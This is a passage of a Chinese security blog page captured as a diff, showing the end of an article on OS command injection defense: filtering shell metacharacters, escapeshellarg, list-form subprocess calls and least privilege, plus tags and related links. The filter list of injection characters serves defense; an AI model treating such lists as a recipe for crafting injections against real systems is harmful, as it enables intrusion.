+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>2. 过滤危险字符
+</span></span><span class=line><span class=cl>   过滤：; | &amp;&amp; || ` &#34; &#39; &lt; &gt;
+</span></span><span class=line><span class=cl>   PHP: escapeshellcmd() / escapeshellarg()
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>3. 避免拼接命令
+</span></span><span class=line><span class=cl>   Python: subprocess.run([&#39;ping&#39;, &#39;-c&#39;, &#39;1&#39;, ip])  # 不要拼接字符串
+</span></span><span class=line><span class=cl>   PHP: exec(&#39;ping -c 1 &#39; . escapeshellarg($ip))
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>4. 最小权限
+</span></span><span class=line><span class=cl>   Web 进程使用普通用户（www-data）
+</span></span><span class=line><span class=cl>   禁止 sudo / 敏感命令执行权限
+</span></span><span class=line><span class=cl>   防火墙限制出站连接
+</span></span></code></pre></td></tr></table></div></div><h2 id=七小结>七、小结</h2><p>命令注入的危害比 SQL 注入更直接——能直接执行操作系统命令。防御核心是<strong>不要拼接用户输入到系统命令中</strong>，使用参数化 API（如 subprocess.run 列表模式）代替字符串拼接。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/>命令注入</a>
+<a href=/tags/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>注入漏洞</a>
+<a href=/tags/os%E5%91%BD%E4%BB%A4/>OS命令</a>
+<a href=/tags/web%E5%AE%89%E5%85%A8/>Web安全</a>
+<a href=/tags/rce/>RCE</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>本站使用「署名 4.0 国际」创作共享协议，可自由转载、引用，但需署名作者且注明文章出处</span></section><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<span>最后更新于 Aug 30, 2026 10:00 +0800</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/751088022/><div class=article-details><h2 class=article-title>命令注入原理与防御</h2></div></a></article><article><a href=/p/751088071/><div class=article-details><h2 class=article-title>Nacos 漏洞利用实战（未授权/认证绕过/反序列化）</h2></div></a></article><article><a href=/p/751088050/><div class=article-details><h2 class=article-title>文件包含漏洞：LFI / RFI 实战</h2></div></a></article><article><a href=/p/751088108/><div class=article-details><h2 class=article-title>SQL注入原理与防御</h2></div></a></article><article><a href=/p/751088109/><div class=article-details><h2 class=article-title>XSS原理与防御</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=SoulJian03/souljian-blog data-repo-id=R_kgDOOckFZw data-category=Genera data-category-id=DIC_kwDOOckFZ84CpSF1 data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"gruvbox")}})()</script><footer class=site-footer><div class=footer-container><div class=footer-left><div class=copyright>&copy;
 2020 -
 2026 SoulJian小站</div><div class=busuanzi-count><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><span class=site-uv title=访客数><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="visitor-icon"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
 <span id=busuanzi_value_site_uv></span>
